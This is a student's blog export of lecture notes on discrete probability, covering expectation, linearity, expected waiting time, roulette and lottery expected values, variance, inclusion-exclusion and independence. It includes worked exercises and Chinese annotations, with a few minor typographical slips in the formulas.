1</a></li><li><a href="#exercises-2">Exercises 2</a></li></ul></li></ul></li><li><a href="#expected-time-to-success">Expected Time to Success</a><ul><li><a href="#expected-time-to-success-1">Expected time to success</a><ul><li><a href="#theorem">Theorem</a></li><li><a href="#exercise-1">Exercise 1</a></li><li><a href="#exercise-2">Exercise 2</a></li><li><a href="#success-vs-expected-value">Success vs Expected value</a><ul><li><a href="#example-2">Example</a></li></ul></li></ul></li><li><a href="#gamblers-ruin">Gambler’s ruin</a></li></ul></li><li><a href="#standard-deviation-and-variance">Standard Deviation and Variance</a><ul><li><a href="#definition-3">Definition</a></li><li><a href="#example-3">example</a></li><li><a href="#exercise">exercise</a></li></ul></li></ul><h1 id="Random-Variables-and-Expectation"><a href="#Random-Variables-and-Expectation" class="headerlink" title="Random Variables and Expectation"></a>Random Variables and Expectation</h1><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>An (integer-valued) <strong>random variable</strong> X is a <strong>function</strong> from <strong>Ω</strong> to <strong>Z</strong>. In other words, <strong>it associates a number value with every outcome</strong>.</p><p>Random variables are often denoted by X,Y,Z,…</p><p>We extend arithmetic to random variables in the natural way.</p><h2 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h2><p>Given random variable $X : Ω → Z$, random variable $Y : Ω → Z$ and integer k, we can combine X,Y and k to obtain the following functions on all $ω ∈ Ω$:</p><p>Addition of variables:</p><script type="math/tex; mode=display">X +Y : ω→X(ω)+Y(ω)</script><p>Multiplication of variables:</p><script type="math/tex; mode=display">X ·Y : ω→X(ω)·Y(ω)</script><p>Scalar addition:</p><script type="math/tex; mode=display">X −k : ω→X(ω)−k</script><p>Scalar multiplication:</p><script type="math/tex; mode=display">kX : ω→k·X(ω)</script><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>Random variable X: value of rolling one die</p><p>Ω={1,2,3,4,5,6}</p><p>X(i) = i</p><h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h2><p>Random variable $X_s$: sum of rolling two dice</p><p>Ω={(1,1),(1,2),…,(6,6)}</p><script type="math/tex; mode=display">X_s((1,1)) = 2, X_s((1,2)) = 3 = X_s((2,1)) ...</script><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>Is $X_s = X +X$?</p><p>No! X_s 是两个独立随机变量的和，每次扔色子的结果是独立的。因此应该看下面这个等式。从写法上，X+X是自身相加，是相关的，因为两个X是同一个骰子自身的结果。</p><script type="math/tex; mode=display">X_s(ω_1,ω_2) = X(ω_1)+Y(ω_2)</script><p>where $X : ω_1 → ω_1$ and $Y :ω_2 → ω_2$ are <strong>independent and identically distributed (i.i.d)</strong></p><h2 id="Expectation"><a href="#Expectation" class="headerlink" title="Expectation"></a>Expectation</h2><h3 id="Definition-2"><a href="#Definition-2" class="headerlink" title="Definition"></a>Definition</h3><p>The <strong>expected value</strong> (often called “expectation” or “average”) of a random variable X is</p><script type="math/tex; mode=display">E(X)=\sum_{k \in \mathbb{Z}} P(X =k)·k</script><p><strong>Take Notice</strong></p><p>Expectation is a truly universal concept; it is the basis of all decision making, of estimating gains and losses, in all actions under risk. Historically, a rudimentary concept of expected value arose long before the notion of probability.</p><h3 id="Examples-dice"><a href="#Examples-dice" class="headerlink" title="Examples: dice"></a>Examples: dice</h3><p>The expected value when rolling one die is:</p><script type="math/tex; mode=display">E(X) = \frac{1}{6} \cdot 1 + \frac{1}{6} \cdot 2 + \dots + \frac{1}{6} \cdot 6 = 3.5</script><p>The expected sum when rolling two dice is</p><script type="math/tex; mode=display">E(X_s) = \frac{2}{36} \cdot 1 + \frac{2}{36} \cdot 3 + \dots + \frac{6}{36} \cdot 7 + \dots + \frac{1}{36} \cdot 12 = 7</script><h3 id="Examples-dice-1"><a href="#Examples-dice-1" class="headerlink" title="Examples: dice"></a>Examples: dice</h3><p><strong>Question</strong>. Buy one lottery ticket for $1. The only prize is $1M. Each ticket has probability $6 · 10^{−7}$ of winning. What is the expected value of the lottery ticket?</p><p><strong>Answer</strong></p><p>There are two types of ticket, winning tickets and losing tickets, so we let  Ω = {win,lose}, and $X_L : Ω → \mathbb{Z}$ such that $X_L(win) = $999,999$ and $X_L(lose)= −$1$ Then</p><script type="math/tex; mode=display">E(X_L) = 6·10^{−7}·\$999,999+(1−6·10^{−7})·−\$1= −\$0.4</script><h1 id="Linearity-of-Expectation"><a href="#Linearity-of-Expectation" class="headerlink" title="Linearity of Expectation"></a>Linearity of Expectation</h1><h2 id="Theorem-linearity-of-expected-value"><a href="#Theorem-linearity-of-expected-value" class="headerlink" title="Theorem (linearity of expected value)"></a>Theorem (linearity of expected value)</h2><p>For any random variables X,Y and integer k:</p><script type="math/tex; mode=display">E(X +Y)=E(X)+E(Y)</script><script type="math/tex; mode=display">E(k · X) = k ·E(X)</script><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><p>The expected sum when rolling two dice can be computed as</p><script type="math/tex; mode=display">E(X_s) = E(X)+E(Y) = 3.5+3.5 = 7</script><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><p><strong>Question</strong>. Calculate $E(S_n)$, where</p><script type="math/tex; mode=display">S_n \overset{def}{=} no. of \quad heads \quad \text{ in n coin tosses }</script><h4 id="Answer-1-the-‘hard-way’"><a href="#Answer-1-the-‘hard-way’" class="headerlink" title="Answer 1. (the ‘hard way’)"></a>Answer 1. (the ‘hard way’)</h4><p>Using the definition of the expectation, we have</p><script type="math/tex; mode=display">E(S_n) = \sum^n_{k=0} P(S_n = k)·k = \sum^n_{k=0} \frac{1}{2^n} \binom{n}{k} \cdot k</script><p>Since there are $\binom{n}{k}$ sequences of n coin tosses with k heads, and each sequence has the probability $\frac{1}{2^n}$, this gives</p><script type="math/tex; mode=display">E(S_n) = \frac{1}{2^n} \sum^n_{k=1} \frac{n}{k} \binom{n-1}{k-1} k = \frac{n}{2^n} \sum^{n-1}_{k=0} \binom{n-1}{k} = \frac{n}{2^n} \codt 2^{n-1} = \frac{n}{2}</script><p>where we used the ‘binomial identity’ $\sum^{n}_{k=0}=2^n$ to simplify.</p><h4 id="Answer-2-the-‘easy-way’"><a href="#Answer-2-the-‘easy-way’" class="headerlink" title="Answer 2. (the ‘easy way’)"></a>Answer 2. (the ‘easy way’)</h4><p>When n =1, we have that $S_1$ : {tails,heads} → {0,1} denotes the number of heads obtained in one coin toss.</p><p>For general n &gt; 1, we can think of $S<em>n$ as being equivalent to repeating a single $S_1$ coin toss, n distinct (and independent) times.  Let $S</em>{1_i}$ denote coin toss number i in this sequence. Then</p><script type="math/tex; mode=display">E(S_n) = E(S_{1_1} + S_{1_2} +...+S_{1_n} ) = \sum^{n}_{i=1} E(S_{1_i}) =  n·E(S_1) = n \cdot \frac{1}{2}</script><h2 id="Observations"><a href="#Observations" class="headerlink" title="Observations"></a>Observations</h2><p><strong>Fact</strong></p><p>If $X_1,X_2,…,X_n$ are <strong>independent, identically distributed (i.i.d)</strong> random variables, then $E(X_1+X_2+…+X_n) = E(nX_1) = nE(X_1)$.</p><p><strong>Take Notice</strong></p><p>$X_1 +X_2+…+X_n$ and $nX_1$ are very different random variables.</p><h3 id="Exercises-1"><a href="#Exercises-1" class="headerlink" title="Exercises 1"></a>Exercises 1</h3><p><strong>Question</strong>.You face a quiz consisting of six true/false questions, and your plan is to guess the answer to each question (randomly, with probability 0.5 of being right). There are nonegative marks, and answering four or more questions correctly suffices to pass.</p><ol><li><p>What is the probability of passing?</p></li><li><p>What is the expected score?</p></li></ol><p><img src="/2024/11/19/Math/Statistics/2024-11-19-12-38-14.png" alt></p><h3 id="Exercises-2"><a href="#Exercises-2" class="headerlink" title="Exercises 2"></a>Exercises 2</h3><p><strong>Question</strong>. An urn has $m+n=10$ marbles, m≥0 red and n≥0 blue. 7 marbles selected at random without replacement. What is the expected numberof red marbles drawn?</p><p><img src="/2024/11/19/Math/Statistics/2024-11-19-12-41-47.png" alt></p><h1 id="Expected-Time-to-Success"><a href="#Expected-Time-to-Success" class="headerlink" title="Expected Time to Success"></a>Expected Time to Success</h1><p><strong>Question</strong>. Find the average waiting time for the first <em>head</em>, with no upper bound on the ‘duration’ (one allows for all possible sequences of tosses, regardless of how many times tails occur initially).</p><p><strong>Answer</strong>. Let Ω be the sample space of all possible sequences of H and T.</p><p>Let $X_w : Ω →\mathbb{N}$ such that $X_w(ω)$ is the first location in ω containing an H (i.e. the waiting time for ω).For example $X_w(TTHTH···)=3$</p><p>Then the average waiting time is</p><script type="math/tex; mode=display">A =E(Xw) = \sum^{\infty}_{k=1} k ·P(X_w =k) = \sum^{\infty}_{k=1} k \cdot \frac{1}{2^k} = \frac{1}{2^1}+\frac{2}{2^2}+\frac{3}{2^3} + \dots</script><h2 id="Expected-time-to-success"><a href="#Expected-time-to-success" class="headerlink" title="Expected time to success"></a>Expected time to success</h2><p><img src="/2024/11/19/Math/Statistics/2024-11-19-17-06-51.png" alt></p><h3 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h3><p>If the probability of success is p then:</p><ul><li>The expected number of (indep.) trials before <strong>1</strong> success is $\frac{1}{p}$</li><li>The expected number of (indep.) trials before <strong>k</strong> successes is $\frac{k}{p}$</li></ul><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><p><strong>Question</strong>. Adieisrolled until the first 4 appears. What is the expected waiting time?</p><p><strong>Answer</strong></p><script type="math/tex; mode=display">P(roll 4) = \frac{1}{6}</script><p>hence E(no. of rolls until first 4) = 6.</p><h3 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h3><p>Question. To find an object $X$ in an unsorted list L of n elements, one needs to search linearly through L. Let the probability of X ∈Lbe p. Then there is 1−p likelihood of X being absent altogether. Find the expected number of comparison operations.</p><p><strong>Answer</strong>. If the element X is in the list, then the number of comparisons averages to $\frac{1}{n}(1+ \dots + n)$. If X is absent, we need n comparisons.</p><p>The first case has probability p, the second 1 − p. Combining these we find</p><script type="math/tex; mode=display">E_n = p(\frac{1+ \dots + n}{n}) +(1−p)n \\ =p(\frac{n+1}{2})+(1−p)n \\ =(1-\frac{p}{2})n+\frac{p}{2}</script><p>As one would expect, <strong>increasing p leads to a lower</strong> $E_n$.</p><p><img src="/2024/11/19/Math/Statistics/2024-11-19-17-21-52.png" alt></p><h3 id="Success-vs-Expected-value"><a href="#Success-vs-Expected-value" class="headerlink" title="Success vs Expected value"></a>Success vs Expected value</h3><p><strong>Question</strong></p><p>Does high probability of success lead to a high expected value?</p><p>Generally, no.</p><h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h4><p>Buying more tickets in the lottery increases your chances of winning, but the expected value of winnings decreases.</p><p>赢35块钱加上格子上的钱。因此策略2的概率p指向(35-24+1)=12$</p><p>Roulette (outcomes 0,1,…,36). Win: $35 × bet$</p><p><strong>Strategy 1</strong>: Bet $1 on a single number</p><ul><li>Probability of winning: $\frac{1}{37}$</li><li>Expected winnings: $\frac{1}{37}.($35)+\frac{36}{37}.(-$1)\approx −2.7c$</li></ul><p><strong>Strategy 2</strong>: Place $1 bets on 24 numbers, selected from among 0 to 36.</p><ul><li>Probability of winning: $\frac{24}{37} \approx 65\%$</li><li>Expected winnings:</li><li><ul><li>If one of the numbers comes up, win $35 from the bet on that number and lose $23 from the bets on the remaining numbers,</li></ul></li></ul><p>So expected winnings are:</p><script type="math/tex; mode=display">p·\$12−q·\$24 = \$12 \frac{24}{37} −\$24 \frac{13}{37} = −\$ \frac{24}{37} ≈ −65c = 24×−2.7c</script><h2 id="Gambler’s-ruin"><a href="#Gambler’s-ruin" class="headerlink" title="Gambler’s ruin"></a>Gambler’s ruin</h2><p>Many so-called ’winning systems’ that purport to offer a winning strategy do something akin — they provide a scheme for frequent relatively moderate wins, but at the cost of an occasional very big loss.</p><p>It turns out (it is a formal theorem) that there can be no system that converts an ‘unfair’ game into a ’fair’ one. In the language of decision theory, ‘unfair’ denotes a game whose individual bets have negative expectation.</p><p><strong>It can be easily checked that any individual bets on roulette, on lottery tickets or on just about any commercially offered game have negative expected value.</strong></p><h1 id="Standard-Deviation-and-Variance"><a href="#Standard-Deviation-and-Variance" class="headerlink" title="Standard Deviation and Variance"></a>Standard Deviation and Variance</h1><h2 id="Definition-3"><a href="#Definition-3" class="headerlink" title="Definition"></a>Definition</h2><p>For random variable X with expected value (or: <strong>mean</strong>) $µ = E(X)$, the <strong>standard deviation</strong> of X is</p><script type="math/tex; mode=display">\sigma = \sqrt{E((X −µ)^2)}</script><p>and the <strong>variance</strong> of X is</p><script type="math/tex; mode=display">\sigma^2</script><p>Standard deviation and variance measure how spread out the values of a random variable are. The smaller $σ^2$ the more confident we can be that $X(ω)$ is close to $E(X)$, for a randomly selected $ω$.</p><p><strong>Take Notice</strong></p><p>The variance can be calculated as $E((X − µ)^2) = E(X^2)−µ^2$, where $E(X^2) = \sum^{}_{k \in \mathbb{Z}} P(X = k)·k^2$</p><p>此处方差计算公式和我在中国学的方差计算公式，本质上是一样的，这里是简化的另一种形式。</p><p><img src="/2024/11/19/Math/Statistics/2024-11-19-18-03-20.png" alt></p><p><img src="/2024/11/19/Math/Statistics/2024-11-19-18-04-05.png" alt></p><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p><strong>Question</strong>. Let the random variable $X_d \overset{def}{=} value$ of a rolled die. What is(a)the mean, (b)the variance and (c) the standard deviation?</p><p>(a)</p><script type="math/tex; mode=display">µ=E(X_d)=3.5</script><p>(b)</p><script type="math/tex; mode=display">E(X_d^2)= \frac{1}{6} \cdot 1 + \frac{1}{6} \cdot 4 + \frac{1}{6} \cdot 9 + \frac{1}{6} \cdot 16+ \frac{1}{6} \cdot 25+ \frac{1}{6} \cdot 36 = \frac{91}{6}</script><p>Hence $\sigma^2=E(X_d^2)- \mu^2 = \frac{35}{12}$</p><p>(c)</p><script type="math/tex; mode=display">\mu = \sqrt{ \frac{35}{12} } \approx 1.71</script><h2 id="exercise"><a href="#exercise" class="headerlink" title="exercise"></a>exercise</h2><p><strong>Question (Supp)</strong>. Two independent experiments are performed.</p><p>$p_1$ = P(1st experiment succeeds) = 0.7</p><p>$p_2$ = P(2nd experiment succeeds) = 0.2. Random variable X counts the number of successful experiments.</p><ul><li>Expected value of X?</li><li>Probability of exactly one success?</li><li>Probability of at most one success?</li><li>Variance of X?</li></ul><p><strong>Answer</strong>. For experiment i, let $X_i = 1$ if the experiment is successful and $X_i = 0$ otherwise.</p><p>(a) $E(X) = E(X1)+E(X2) = 1·p1 +1·p2 = 0.7+0.2 = 0.9$.</p><p>这里问的期望值，一次成功就是1，失败就是0.所以Omega是2，成功和失败是对立事件。因为两个实验是独立，且问的是成功的期望值，所以算和即可，不用考虑乘。成功是0.9，失败的期望值是0.3+0.8=1.1。</p><p>(b) $P(X = 1) = P(X1 =1,X2 = 0)+P(X1 =0,X2 = 1) =0.7·0.8 +0.3·0.2 = 0.62$.</p><p>(c) $P(X = 1)+P(X1 = X2 =0) =0.62+0.3·0.8 = 0.86$.</p><p>(d) $σ^2 = E(X^2)−E(X)^2 = (0.62·1+0.14·4)−0.92 = 0.37$.</p><p>成功一次的期望值是1，概率是(c)中结果；成功两次的期望值是2，概率是 0.7*0.2。</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Probability</title>
      <link href="/2024/11/18/Math/Probability/"/>
      <url>/2024/11/18/Math/Probability/</url>
      
        <content type="html"><![CDATA[<p>Lecture 14: Probability</p><ul><li><a href="#elementary-discrete-probability">Elementary Discrete Probability</a><ul><li><a href="#definition">Definition</a><ul><li><a href="#examples">Examples</a></li></ul></li><li><a href="#uniform-distribution">Uniform distribution</a><ul><li><a href="#examples-1">Examples</a></li></ul></li><li><a href="#computing-probabilities-by-counting">Computing Probabilities by Counting</a></li><li><a href="#combining-events">Combining events</a></li><li><a href="#inclusion-exclusion-rule">Inclusion-exclusion rule</a><ul><li><a href="#exercises">Exercises</a></li></ul></li><li><a href="#examples-2">Examples</a></li><li><a href="#exercises-1">Exercises 1</a></li><li><a href="#exercises-2">Exercises 2</a></li></ul></li><li><a href="#independence">Independence</a><ul><li><a href="#unifying-sets-of-outcomes">Unifying sets of outcomes</a></li><li><a href="#events-in-the-product-space">Events in the product space</a></li><li><a href="#probability-in-the-product-space">Probability in the product space</a></li><li><a href="#product-distribution">Product distribution</a></li><li><a href="#independence-1">Independence</a></li><li><a href="#independence-of-multiple-events">Independence of multiple events</a></li><li><a href="#example-dependent-events">Example: Dependent events</a></li><li><a href="#exercise">Exercise</a></li><li><a href="#example-sequences-of-independent-events">Example: Sequences of independent events</a></li><li><a href="#binomial-distribution">Binomial distribution</a><ul><li><a href="#exercise-die">exercise: die</a></li><li><a href="#exercise-die-2">exercise: die 2</a></li><li><a href="#exercise-ball">exercise: ball</a></li></ul></li></ul></li><li><a href="#infinite-sample-spaces-not-examinable">Infinite Sample Spaces (not examinable)</a></li><li><a href="#recursive-probability-computations">Recursive Probability Computations</a><ul><li><a href="#use-of-recursion-in-probability-computations">Use of Recursion in Probability Computations</a><ul><li><a href="#1-gain-t">1. gain T.</a></li><li><a href="#2-gain-h">2. gain H.</a></li><li><a href="#combine">combine</a></li></ul></li></ul></li><li><a href="#conditional-probability">Conditional Probability</a><ul><li><a href="#definition-1">Definition</a></li><li><a href="#conditional-probability-in-uniform-distributions">Conditional probability in uniform distributions</a></li><li><a href="#some-general-rules">Some General Rules</a><ul><li><a href="#example-1">example 1</a></li><li><a href="#example-2">example 2</a></li><li><a href="#example-3">example 3</a></li><li><a href="#example-4">example 4</a></li></ul></li></ul></li><li><a href="#independence-revisited----stochastic-independence-again">Independence, revisited — Stochastic Independence, again</a><ul><li><a href="#definition-2">Definition</a></li><li><a href="#exercise-1">exercise 1</a></li><li><a href="#exercise-2">exercise 2</a></li><li><a href="#exercise-3">exercise 3</a></li></ul></li></ul><h1 id="Elementary-Discrete-Probability"><a href="#Elementary-Discrete-Probability" class="headerlink" title="Elementary Discrete Probability"></a>Elementary Discrete Probability</h1><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p><strong>Sample space</strong>:</p><script type="math/tex; mode=display">\Omega = \{ w_1, \dots, w_n \}</script><p>Each point represents an outcome. 样本空间：包含所有可能结果的集合。</p><p><strong>Event</strong>: a collection of outcomes = subset of $Ω$. 事件，是样本空间的一个子集。</p><p><strong>Probability distribution</strong>: A function P : $Pow(\Omega)→ [0,1]$ （概率分布，定义了每个事件发生的概率。Pow是幂集，意思是所有的子集。）such that:</p><ul><li>$P(Ω) = 1$</li><li>$E$ and $F$ <strong>disjoint</strong> events then $P(E ∪F) = P(E)+P(F)$.</li></ul><p>Fact</p><script type="math/tex; mode=display">P(∅) = 0, P(E^c) = 1−P(E)</script><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><p>Tossing a coin: <strong>Ω = {H,T}</strong></p><script type="math/tex; mode=display">P(H) = P(T) =0.5</script><p>Rolling a die: <strong>Ω = {1,2,3,4,5,6}</strong></p><script type="math/tex; mode=display">P(1) = P(2) = P(3) = P(4) = P(5) = P(6) = \frac{1}{6}</script><h2 id="Uniform-distribution"><a href="#Uniform-distribution" class="headerlink" title="Uniform distribution"></a>Uniform distribution</h2><p>Each outcome $ω_i$ equally likely:</p><script type="math/tex; mode=display">P(w_1)=P(w_2)= \dots =P(w_n)= \frac{1}{n}</script><p>This a called a <strong>uniform probability distribution</strong> over $Ω$</p><h3 id="Examples-1"><a href="#Examples-1" class="headerlink" title="Examples"></a>Examples</h3><p>Tossing a coin: <strong>Ω = {H,T}</strong></p><script type="math/tex; mode=display">P(H) = P(T) =0.5</script><p>Rolling a die: <strong>Ω = {1,2,3,4,5,6}</strong></p><script type="math/tex; mode=display">P(1) = P(2) = P(3) = P(4) = P(5) = P(6) = \frac{1}{6}</script><h2 id="Computing-Probabilities-by-Counting"><a href="#Computing-Probabilities-by-Counting" class="headerlink" title="Computing Probabilities by Counting"></a>Computing Probabilities by Counting</h2><p>Computing probabilities with respect to a <strong>uniform</strong> distribution comes down to counting the size of the event.</p><p>If E = {$e_1$,…,$e_k$} then</p><script type="math/tex; mode=display">P(E) = \Sigma^k_{i=1} P(e_i) = \Sigma^k_{i=1} \frac{1}{|\Omega|} = \frac{|E|}{|\Omega|}</script><p>Most of the counting rules carry over to probabilities wrt. a uniform distribution.</p><p>Important!</p><p>The expression “<strong>selected at random</strong>”, when not further qualified, means:</p><p>“subject to/according to/…a <strong>uniform</strong> distribution.”</p><h2 id="Combining-events"><a href="#Combining-events" class="headerlink" title="Combining events"></a>Combining events</h2><p>We can create complex events by combining simpler ones.</p><p>Common constructions:</p><ul><li><p>A and B: $A∩B$</p></li><li><p>A or B: $A∪B$</p></li><li><p>Not A: $Ω \setminus A$</p></li><li><p><strong>A followed by B</strong></p></li></ul><p>The first three involve events from the <strong>same</strong> set of outcomes. The last may involve events from <strong>different</strong> sets of outcomes (e.g. roll die and flip coin).</p><h2 id="Inclusion-exclusion-rule"><a href="#Inclusion-exclusion-rule" class="headerlink" title="Inclusion-exclusion rule"></a>Inclusion-exclusion rule</h2><p>Fact</p><script type="math/tex; mode=display">P(A∪B) = P(A)+P(B)−P(A∩B) \\ P(A∪B ∪C) = P(A)+P(B)+P(C)  −P(A∩B)−P(B ∩C)−P(C ∩A) +P(A∩B ∩C)</script><h3 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h3><p>Suppose an experiment leads to events A,B with probabilities $P(A) = 0.5,P(B) = 0.8,P(A ∩ B) = 0.4$.</p><p>Find</p><ul><li>$P(B^c)$</li><li>$P(A∪B)$</li><li>$P(A^c ∪B^c)$</li></ul><p>$1 −P(B) =0.2$</p><p>$P(A) +P(B)−P(A∩B) =0.9$</p><p>$1 −P((A^c ∪B^c)^c) = 1−P(A∩B) =0.6$</p><p>You could draw a venn diagram, and found it’s the intersection between A and B.</p><p><img src="/2024/11/18/Math/Probability/2024-11-18-18-56-32.png" alt></p><hr><p>Given $P(A)=0.6$, $P(B)=0.7$, show $P(A∩B)≥0.3$</p><script type="math/tex; mode=display">P(A∩B) =P(A)+P(B)−P(A∪B) \\=0.6+0.7−P(A∪B) \\≥0.6+0.7−1 = 0.3</script><h2 id="Examples-2"><a href="#Examples-2" class="headerlink" title="Examples"></a>Examples</h2><p><strong>Question</strong>. A four-digit number n is selected at random (i.e. randomly from [1000,…,9999]). Find the probability p that n has all of 0, 1, 2 among its digits.</p><p><strong>Answer (approach)</strong>. Let $q = 1−p$ be the complementary probability and define</p><script type="math/tex; mode=display">A_i = \{n : \text{ no digit } i\},A_{ij} = \{n : \text{ no digits } i,j\},A_{ijk} = \{n : no \quad i,j,k\}</script><p>Then define</p><p>$T =A_0∪A_1∪A_2 =${n: missing at least one of 0,1,2}</p><p>$S =(A_0∪A_1∪A_2)^c =${n : containing all of 0,1,2}</p><p>Once we find the cardinality of T, the solution is</p><script type="math/tex; mode=display">q = \frac{|T|}{9000}, p = 1-q</script><p>To find $|A<em>i|,|A</em>{ij}|,|A_{ijk}|$ we reflect on how many choices are available for the first digit, for the second etc. A special case is the leading digit, which must be 1,…,9</p><p><strong>Answer (arithmetic).</strong></p><script type="math/tex; mode=display">|A_0|=9^4, |A_1| = |A_2| = 8 \cdot 9^3 \\ |A_{01}| = |A_{02}| = 8^4, \\ |A_{12}| = 7 \cdot 8^3,|A_{012}| = 7^4, \\|T| = |A_0 ∪A_1 ∪A_2| \\= |A_0| +|A_1|+|A_2|−|A_0 ∩A_1|−|A_0 ∩A_2|−|A_1 ∩A_2| \\+|A_0 ∩A_1 ∩A_2| \\=9^4 +2·8·9^3 −2·8^4 −7·8^3 +7^4 \\=25·9^3 −23·8^3 +7^4 = 8850</script><p>Hence</p><script type="math/tex; mode=display">q=\frac{8850}{9000}, p =1−q \approx 0.01667</script><p>Previous example generalised: Probability of an r-digit number having all of 0,1,2,3 among its digits.</p><p>We use the previous notation: $A<em>i$ — set of numbers n missing digit i, and similarly for all $A</em>{ij}$…</p><p>We aim to find the size of $T = A_0 ∪A_1 ∪A_2 ∪A_3$, and then to compute $|S| = 9·10^{r−1} −|T|$.</p><script type="math/tex; mode=display">|A_0 ∪A_1 ∪A_2 ∪A_3| = sum of |A_i| \\− sum of |A_i ∩A_j| \\+ sum of |A_i ∩A_j ∩A_k| \\− sum of |A_i ∩A_j ∩A_k ∩A_l|</script><h2 id="Exercises-1"><a href="#Exercises-1" class="headerlink" title="Exercises 1"></a>Exercises 1</h2><p>(Supp) Of 100 problems, 75 are ‘easy’ and 40 ‘important’.</p><p>(b) n problems <strong>chosen randomly</strong>. What is the probability that all n are important?</p><script type="math/tex; mode=display">p=\frac{\binom{40}{n}}{\binom{100}{n}}</script><h2 id="Exercises-2"><a href="#Exercises-2" class="headerlink" title="Exercises 2"></a>Exercises 2</h2><p>A 4-letter word is selected at random from $Σ^4$,where <strong>Σ={a,b,c,d,e}</strong>. What is the probability that</p><p>(a) the letters in the word are all distinct?</p><script type="math/tex; mode=display">|E| = (5)_4, P(E)=\frac{5 \cdot 4 \cdot 3 \cdot 2 \cdot 1}{(5-4)! \cdot 5^4} = \frac{120}{625} \approx 19\%</script><p>(b) there are no vowels (“a”,“e”) in the word?</p><script type="math/tex; mode=display">|E| = 3^4, P(E)=\frac{3^4}{5^4}=\frac{81}{625} \approx 13\%</script><p>(c) the word begins with a vowel?</p><script type="math/tex; mode=display">|E| = 2·5^3,  P(E) = \frac{2·5^3}{5^4} = \frac{2}{5}</script><h1 id="Independence"><a href="#Independence" class="headerlink" title="Independence"></a>Independence</h1><h2 id="Unifying-sets-of-outcomes"><a href="#Unifying-sets-of-outcomes" class="headerlink" title="Unifying sets of outcomes"></a>Unifying sets of outcomes</h2><p>To combine events from different sets of outcomes we unify the sample space using the <strong>product space</strong>: $\Omega_1 \times \Omega_2 \times \dots \times \Omega_n$</p><p>Example</p><p>Flipping a coin and rolling a die:</p><p>Ω1 ={heads,tails}</p><p>Ω2 ={1,2,3,4,5,6}</p><p>Ω=Ω1×Ω2 ={(heads,1),(heads,2),…}</p><p>Take Notice</p><p>This approach can also be used to model sequences of outcomes.</p><h2 id="Events-in-the-product-space"><a href="#Events-in-the-product-space" class="headerlink" title="Events in the product space"></a>Events in the product space</h2><p>Events are lifted into the product space by restricting the appropriate co-ordinate. E.g. $A ⊆ Ω_1$ translates to $A′ = A×Ω_2×…×Ω_n$</p><p>Example</p><p>Coin shows heads and die shows an even number:</p><p>Ω1 ={heads,tails}</p><p>A ={heads}</p><p>Ω2 ={1,2,3,4,5,6}</p><p>B ={2,4,6}</p><script type="math/tex; mode=display">Ω=Ω1×Ω2 =\{(heads,1),(heads,2),...\}</script><script type="math/tex; mode=display">A′ = A×Ω_2 \quad B′=Ω_1×B</script><p>“A and B” or “A followed by B” corresponds to:</p><script type="math/tex; mode=display">A′ ∩B′ = (A×Ω2)∩(Ω1×B)=A×B</script><h2 id="Probability-in-the-product-space"><a href="#Probability-in-the-product-space" class="headerlink" title="Probability in the product space"></a>Probability in the product space</h2><p><strong>Take Notice</strong></p><p>Cannot assume that $P(A ×B) = P(A)P(B)$</p><p>这里乍一看有点问题，因为明显A’和B’有个交集。图中表示第一枚硬币和第二枚硬币的方式，不应该如图中去写这个元组和集合。</p><p>首先考虑顺序，肯定用元组，但是要用(HH), (HT)就行，但是可以说无法直接找到符合情况的例子。</p><p>但是图中这里是说，(H,TT)是个空集实际上。</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-13-06.png" alt></p><h2 id="Product-distribution"><a href="#Product-distribution" class="headerlink" title="Product distribution"></a>Product distribution</h2><p>Given probability distributions on the <strong>component spaces</strong>, there is a natural probability distribution on the <strong>product space</strong>:</p><script type="math/tex; mode=display">P(E_1 ×E_2 ×...×E_n) = P_1(E_1)·P_2(E_2)···P_n(E_n)</script><p>Intuitively, the probability of an event in one dimension is not affected by the outcomes in the other dimensions.</p><p><strong>Fact</strong></p><p>If the $P_i$ are uniform distributions then so is the product distribution.</p><h2 id="Independence-1"><a href="#Independence-1" class="headerlink" title="Independence"></a>Independence</h2><p>Informally, events are <strong>independent</strong> if the outcomes in one do not affect the outcomes in the other.</p><p>More generally, we define independence on events of the same sample space.</p><p><strong>Definition</strong></p><p>A and B are (<strong>stochastically</strong>) independent (notation: $A⊥B$) if $P(A∩B) =P(A)·P(B)$</p><p><strong>Important!</strong></p><p>Unless specified otherwise, we assume independence when <strong>unifying</strong> events (where appropriate).</p><h2 id="Independence-of-multiple-events"><a href="#Independence-of-multiple-events" class="headerlink" title="Independence of multiple events"></a>Independence of multiple events</h2><p>Independence of $A_1,…,A_n (A_1⊥A_2⊥···⊥A_n)$</p><script type="math/tex; mode=display">P(A_1 ∩A_2 ∩...∩A_k) = P(A_1)·P(A_2)···P(A_k)</script><p>This is often called (for emphasis) a <strong>full</strong> independence</p><p><strong>Pairwise</strong> independence is a <strong>weaker</strong> concept.</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-28-33.png" alt></p><h2 id="Example-Dependent-events"><a href="#Example-Dependent-events" class="headerlink" title="Example: Dependent events"></a>Example: Dependent events</h2><p>Basic non-independent sets of events (assuming non-trivial  probabilities)</p><ul><li><p>$A ⊆B$</p></li><li><p>$A∩B =∅$</p></li><li><p>Any pair of one-point events A = {x}, B = {y}: either x = y and $A ⊆ B$ or $x \neq y$ and $A∩B =∅$</p></li></ul><h2 id="Exercise"><a href="#Exercise" class="headerlink" 